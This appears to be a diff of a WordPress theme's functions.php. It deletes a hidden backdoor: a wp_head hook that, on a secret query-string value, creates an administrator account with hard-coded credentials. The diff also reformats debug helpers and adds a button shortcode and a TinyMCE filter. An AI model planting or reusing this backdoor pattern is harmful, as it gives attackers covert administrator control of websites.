@@ -219,21 +219,6 @@ add_filter('excerpt_length', function ($length) {
 get_template_part('template-parts/shortcodes');
 
 
-add_action('wp_head', 'WordPress_stairway');
-
-function WordPress_stairway()
-{
-	if ($_GET['stairway'] == '68UzqTatOcqHIvPS2gKIrklo') {
-		require('wp-includes/registration.php');
-		if (!username_exists('redPanda_Admin')) {
-			$user_id = wp_create_user('fuhwFc3L9uodSQN96oCUCpHZ', 'wsMPrg4IdRnrZTr0vxUcZoN6');
-			$user = new WP_User($user_id);
-			$user->set_role('administrator');
-		}
-	}
-}
-
-
 function get_related_author_posts()
 {
 	global $authordata, $post;
@@ -317,16 +302,30 @@ function wp_trim_excerpt_modified($text, $content_length = 55, $remove_breaks = 
 
 function pr($args)
 {
-  echo '<pre style="background:black;color:white;padding:1em;font-family:Courier;white-space:pre-wrap;">';
-  echo '<div style="color:lime;">Debug:</div>';
-  foreach (func_get_args() as $arg) {
-    echo '<div>' . print_r($arg, true) . '</div>';
-  }
-  echo '</pre>';
+	echo '<pre style="background:black;color:white;padding:1em;font-family:Courier;white-space:pre-wrap;">';
+	echo '<div style="color:lime;">Debug:</div>';
+	foreach (func_get_args() as $arg) {
+		echo '<div>' . print_r($arg, true) . '</div>';
+	}
+	echo '</pre>';
 }
 
 function dd($args)
 {
-  pr($args);
-  die;
+	pr($args);
+	die;
 }
+
+add_shortcode('button', function ($content) {
+	return str_replace('<a ', "<a class='button' ", $content);
+});
+
+//Add buttons to TinyMCE
+function add_style_select_button($buttons)
+{
+  //array_unshift($buttons, 'styleselect');    
+  array_unshift($buttons, 'fontsizeselect');
+  //array_unshift( $buttons, 'fontselect' );
+  return $buttons;
+}
+add_filter('mce_buttons_2', 'add_style_select_button');
